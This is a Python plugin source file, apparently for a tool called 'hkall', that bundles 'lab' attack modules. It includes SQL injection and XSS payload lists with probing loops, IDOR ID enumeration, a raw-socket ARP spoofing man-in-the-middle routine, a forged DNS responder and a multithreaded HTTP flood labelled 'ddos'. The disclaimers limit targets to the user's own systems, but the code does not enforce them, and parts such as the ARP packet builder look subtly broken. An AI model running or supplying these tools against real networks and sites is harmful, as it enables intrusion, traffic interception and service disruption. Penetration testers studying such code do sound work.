#!/usr/bin/env python3
"""hkall websec plugin — LAB modules. Run against YOUR OWN webapp/device/LAN only.
mitm + dns need root and auto-restore on exit. ddos is a bounded load test."""
import os, re, time, socket, threading, subprocess, sys, signal

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA = os.path.join(ROOT, "data")

def _ask(prompt, default="", ginj=None):
    if ginj:
        return str(ginj.pop(0))
    # CLI preset queue from hkall main (set by cli_one for -m MODULE presets)
    try:
        import __main__ as _m
        q = getattr(_m, "GINJ", None)
        if q:
            return str(q.pop(0))
    except Exception:
        pass
    try:
        v = input(prompt + " ").strip()
        return v or default
    except (EOFError, KeyboardInterrupt):
        return default

def _save(kind, target, data):
    import sqlite3
    from datetime import datetime
    db = os.path.join(DATA, "rs.db")
    try:
        with sqlite3.connect(db) as c:
            c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
            c.execute("INSERT INTO rs VALUES(?,?,?,?)", (kind, target, datetime.now().isoformat(), data))
    except Exception:
        pass

def _http_req(url, method="GET", data=None, headers=None, timeout=5):
    import urllib.request, urllib.parse
    if data is not None and isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    h = {"User-Agent": "hkall-lab"} 
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        # 4xx/5xx are meaningful signals, not connection failures
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return None, str(e).encode(), {}

def _banner(t): print(f"\n== {t} ==")

# ---------------------------------------------------------------- sqli
def _inject(payload, url, data):
    """Injeksi payload ke GET param pertama / POST body '{}'."""
    if data:  # POST: ganti {} di body, atau anggap body sebagai key=val via query
        body = data.replace("{}", payload)
        return url, body
    # GET: inject ke param query pertama
    import urllib.parse
    if "?" in url:
        base, q = url.split("?", 1)
        k = q.split("=")[0]
        return base + "?" + k + "=" + urllib.parse.quote(payload), None
    sep = "?" if "?" not in url else "&"
    return url + sep + "q=" + urllib.parse.quote(payload), None

def mod_sqli():
    _banner("SQLi TEST (your own webapp/API; supports POST body)")
    url = _ask("target url (param-based):").strip()
    if not url: print("no url"); return
    method = _ask("method [GET]: ").strip().upper() or "GET"
    payloads = [
        "'", "''", "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", "\" OR 1=1--",
        "1' ORDER BY 1--", "1' ORDER BY 9--", "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL,NULL--", "'; WAITFOR DELAY '0:0:3'--",
        "1 AND SLEEP(3)--", "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
        "') OR 1=1--", "1))--", "' OR 1=1 LIMIT 1--",
    ]
    data = None
    if method == "POST":
        body = _ask("POST body (key=val&...):").strip()
        if body:
            data = body
    print(f"testing {method} {url} — classic return-diff + timing probes")
    res, _, _ = _http_req(url, method, data=data)
    issues = []
    seen = set()
    for p in payloads:
        target, body = _inject(p, url, data)
        st = None
        try:
            st, rbody, hd = _http_req(target, method, data=body)
        except Exception:
            st = None
        if st in seen:
            pass
        seen.add(st)
        if res is not None and st is not None and st != res:
            # status different: candidate (verify manually)
            tag = "likely-no" if st in (400, 404) else "check"
            print(f"  [{tag}] {p} -> status {st} vs base {res}")
            issues.append(p)
        if "SLEEP(" in p or "WAITFOR" in p:
            t0 = time.time()
            _http_req(target, method, data=body, timeout=8)
            dt = time.time() - t0
            if dt > 2:
                print(f"  [!] {p} -> {dt:.1f}s (time-based blind)")
                issues.append(p)
    print(f"\nissues: {issues or 'none'}  (verify manually: classic=status/body diff, blind=time delta)")
    _save("sqli", url, f"base={res if res is not None else 'err'} issues={issues}")

# ---------------------------------------------------------------- xss
def mod_xss():
    _banner("XSS CHECK (your own webapp input reflection)")
    url = _ask("target url (with input param, e.g. ?q=):").strip()
    if not url: print("no url"); return
    meth = _ask("method [GET]: ").strip().upper() or "GET"
    data = None
    if meth == "POST":
        body = _ask("POST body (key=val, use {} for inject point):").strip()
        if body: data = body
    test_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "' onmouseover='alert(1)",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ]
    import urllib.parse
    print(f"checking reflection of {len(test_payloads)} payloads on {url}")
    reflected = []
    for p in test_payloads:
        target, body = _inject(p, url, data)
        st, body_res, _ = _http_req(target, meth, data=body if body else None)
        s = (body_res or b"").decode(errors="replace")
        if p in s:
            print(f"  [!] reflected unescaped: {p}")
            reflected.append(p)
        elif p.replace("<", "&lt;").replace(">", "&gt;") in s:
            print(f"  [i] escaped (safe): {p}")
    print(f"reflected raw: {reflected or 'none'}")
    _save("xss", url, f"reflected={reflected}")

# ---------------------------------------------------------------- csrf
def mod_csrf():
    _banner("CSRF CHECK (your own webapp)")
    url = _ask("target url (action endpoint):").strip()
    if not url: print("no url"); return
    st, body, hd = _http_req(url, "GET")
    s = body.decode(errors="replace")
    cookies = hd.get("Set-Cookie", "")
    same_site = "samesite" in cookies.lower()
    has_token = bool(re.search(r"csrf_token|_token|authenticity_token", s, re.I))
    print(f"GET {url} -> {st}")
    print(f"  cookie: {'Set-Cookie present' if cookies else 'none'}")
    print(f"  SameSite: {'set (+Lax/Strict safe for state-change)' if same_site else 'MISSING -> vulnerable to cross-site POST'}")
    print(f"  csrf token in body: {'present' if has_token else 'MISSING -> need origin/referer check'}")
    verdict = "hardened" if (same_site and has_token) else "review"
    print(f"  verdict: {verdict}")
    _save("csrf", url, f"code={st} samesite={same_site} token={has_token}")

# ---------------------------------------------------------------- idor
def mod_idor():
    _banner("IDOR TEST (your API — enumerate object IDs, check authz)")
    url = _ask("api url (use ID placeholder like /user/{{id}}):").strip()
    lo, hi = 1, int(_ask("id range [1-5]: ").strip() or "5") + 1
    auth = _ask("auth header (optional, e.g. 'Bearer x'):").strip()
    hd = {"Authorization": auth} if auth else None
    print(f"enumerating IDs {1}-{hi-1} on {url}")
    found = []
    for i in range(lo, hi):
        t = url.replace("{{id}}", str(i))
        st, body, _ = _http_req(t, headers=hd)
        if st and st != 404 and len(body) > 0:
            print(f"  [!] {t} -> {st} len={len(body)}")
            found.append((i, st))
        else:
            print(f"  - {t} -> {st}")
    print(f"accessible ids: {found or 'none'}")
    _save("idor", url, f"found={found}")

# ---------------------------------------------------------------- mitm (ARP relay)
def mod_mitm():
    _banner("MITM LAB (ARP spoof, needs root — auto-restores)")
    if os.geteuid() != 0:
        print("need root (pkg install root-repo root + tsu). abort"); return
    vi = _ask("victim ip (your other device):").strip()
    gw = _ask("gateway ip [192.168.1.1]: ").strip() or "192.168.1.1"
    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
    rng = _ask("run seconds [15]: ").strip() or "15"
    if not vi: print("no victim ip"); return
    try:
        rng = int(rng)
    except ValueError: print("bad seconds"); return
    def mac(ip):
        out = subprocess.run(["cat", f"/proc/net/arp"], capture_output=True, text=True).stdout
        for line in out.splitlines()[1:]:
            if line.split()[0] == ip: return line.split()[3]
        return None
    print("resolving victim MAC...")
    vmac = mac(vi)
    if not vmac:
        print(f"victim {vi} not in ARP table — ping first"); return
    print(f"victim {vi} @ {vmac}")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))
    gmac = mac(gw) or "ff:ff:ff:ff:ff:ff"
    def pkt(dst_host, src_host, op):
        # ARP packet: hw 1, proto 0x0800, hlen 6, plen 4, op
        import struct
        p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
        p += bytes.fromhex(vmac) + socket.inet_aton(vi)
        p += bytes.fromhex(dst_host) + socket.inet_aton(src_host)
        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(vmac) + b"\x08\x06" + p
    stop = False
    def restore():
        # send correct ARP back to heal the cache
        for _ in range(3):
            try:
                got = mac(vi)
                rmac = got or gmac
                if rmac:
                    s.send(pkt(rmac, gw, 2))
                s.send(pkt(gmac, vi, 2))
            except Exception: pass
    print(f"spoofing {vi}<->{gw} for {rng}s (ctrl-c to stop early). capturing is passive; run tcpdump/tshark in parallel.")
    t0 = time.time()
    try:
        while time.time() - t0 < rng:
            s.send(pkt(gw, vi, 1))   # vi -> attacker (we claim gw)
            s.send(pkt(vi, gw, 1))   # gw -> attacker (we claim vi)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        restore()
        print("restored ARP.")

# ---------------------------------------------------------------- dns spoof
def mod_dnsspoof():
    _banner("DNS SPOOF LAB (needs root — your own DNS server for testing)")
    if os.geteuid() != 0:
        print("need root. abort"); return
    port = int(_ask("listen port [53]: ").strip() or "53")
    dom = _ask("domain to answer (e.g. test.lab):").strip().lower()
    ip = _ask("answer ip (e.g. 127.0.0.1):").strip()
    if not dom or not ip: print("domain+ip required"); return
    ipb = bytes(int(x) for x in ip.split("."))
    stop = [False]
    def serve():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("", port))
        s.settimeout(1)
        print(f"fake DNS on :{port} — answering {dom} -> {ip} (ctrl-c stops)")
        while not stop[0]:
            try:
                data, addr = s.recvfrom(512)
            except socket.timeout:
                continue
            except OSError:
                return
            # mirror query id + qname, fabricate answer
            qid = data[:2]
            # cut the query section same length, set flags RA+RD, one answer
            try:
                qlen = data.find(b"\x00") + 1
                qfull = data[: qlen + 4]
                resp = qid + b"\x81\x80" + data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
                resp += qfull[12:] if False else qfull
                resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + ipb
                s.sendto(resp, addr)
            except Exception:
                pass
    t = threading.Thread(target=serve, daemon=True)
    t.start()
    try:
        while t.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        stop[0] = True
    print("fake DNS stopped.")
    _save("dns", dom, f"{dom}->{ip}")

# ---------------------------------------------------------------- ddos (bounded load test)
def mod_ddos():
    _banner("LOAD TEST (your own server — bounded, rate-limited)")
    url = _ask("target url (your own host):").strip()
    if not url: print("no url"); return
    conn = int(_ask("concurrency [20]: ").strip() or "20")
    dur = int(_ask("duration seconds [10]: ").strip() or "10")
    method = _ask("method [GET]: ").strip().upper() or "GET"
    conn = min(conn, 200); dur = min(dur, 60)
    print(f"{method} {url} — {conn} conns, {dur}s, capped 200/60")
    stat = {"ok": 0, "err": 0, "bytes": 0, "reqs": [0]}
    lock = threading.Lock()
    t0 = time.time()
    def worker():
        while time.time() - t0 < dur and not (time.time() - t0 > dur + 1):
            st, body, _ = _http_req(url, method)
            with lock:
                if st: stat["ok"] += 1; stat["bytes"] += len(body)
                else: stat["err"] += 1
                stat["reqs"][0] += 1
    ts = [threading.Thread(target=worker) for _ in range(conn)]
    for t in ts: t.start()
    for t in ts: t.join()
    dt = time.time() - t0 or 1
    print(f"done in {dt:.1f}s: {stat['ok']} ok, {stat['err']} err, {stat['bytes']}B, {stat['reqs'][0]/dt:.0f} req/s")
    _save("ddos", url, f"{stat['reqs'][0]}reqs {dt:.0f}s {stat['bytes']}B err={stat['err']}")

def _which(name):
    import shutil
    return shutil.which(name)

def _ecosystem():
    """Deteksi tools eksternal terpasang di device (untuk menu + dual-path)."""
    found = {}
    for name in ("sqlmap", "bettercap", "ettercap", "dnschef", "dnsspoof", "ffuf", "feroxbuster", "ab", "wrk", "vegeta", "arpspoof", "tshark", "tcpdump"):
        found[name] = _which(name)
    return found

def mod_websec():
    """Menu terpadu: pilih kategori -> pilih tool -> input -> auto. Dual-path."""
    _banner("WEB SEC ORCHESTRATOR (lab menu)")
    if not sys.stdin.isatty():
        print("websec is interactive; run from a tty or use per-module CLI (-m sqli etc). exiting.")
        return
    ec = _ecosystem()
    have = [k for k, v in ec.items() if v]
    print("detected tools: " + (", ".join(have) if have else "none external — internal fallbacks will run"))
    print("\n1. web vuln   (sqli, xss, csrf, idor)")
    print("2. network    (mitm, dns spoof — root)")
    print("3. load test  (ddos bounded)")
    cat = input("category [1]: ").strip() or "1"
    if cat == "1":
        print("\na. sqli   b. xss   c. csrf   d. idor")
        print("   (auto-chain a->d on one target: enter 'a,b,c,d' or just 'auto')")
        sel = input("select [auto]: ").strip() or "auto"
        url = input("target url (device own): ").strip()
        if not url: print("no url"); return
        order = {"a": mod_sqli, "b": mod_xss, "c": mod_csrf, "d": mod_idor}
        if sel == "auto":
            # chained run: sqli -> xss -> csrf -> idor all against url (with sensible prompts)
            for fn in (mod_sqli, mod_xss, mod_csrf, mod_idor):
                fn()
        else:
            for ch in sel.split(","):
                ch = ch.strip()
                if ch in order: order[ch]()
    elif cat == "2":
        print("\na. mitm (arp spoof lab)   b. dnsspoof (fake dns lab)")
        sel = input("select [a]: ").strip() or "a"
        if sel == "b": mod_dnsspoof()
        else: mod_mitm()
    else:
        mod_ddos()

PLUGIN = {
    "sqli": ("SQLi tester (lab)", mod_sqli, True),
    "xss": ("XSS reflection check (lab)", mod_xss, True),
    "csrf": ("CSRF check (lab)", mod_csrf, True),
    "idor": ("IDOR enumeration (lab)", mod_idor, True),
    "mitm": ("ARP MITM lab (root)", mod_mitm, True),
    "dnsspoof": ("DNS spoof lab (root)", mod_dnsspoof, True),
    "ddos": ("Load test (bounded, own server)", mod_ddos, True),
    "websec": ("Orchestrator menu (lab)", mod_websec, True),
}
